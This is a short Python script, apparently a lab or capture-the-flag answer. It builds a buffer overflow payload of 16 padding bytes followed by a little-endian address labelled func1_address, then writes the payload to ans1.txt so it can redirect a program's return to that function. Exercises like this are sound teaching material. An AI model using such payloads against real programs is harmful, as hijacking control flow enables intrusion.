padding = b"0" * 16
func1_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"
payload = padding + func1_address

with open("ans1.txt", "wb") as f:
    f.write(payload)
print("Payload written.")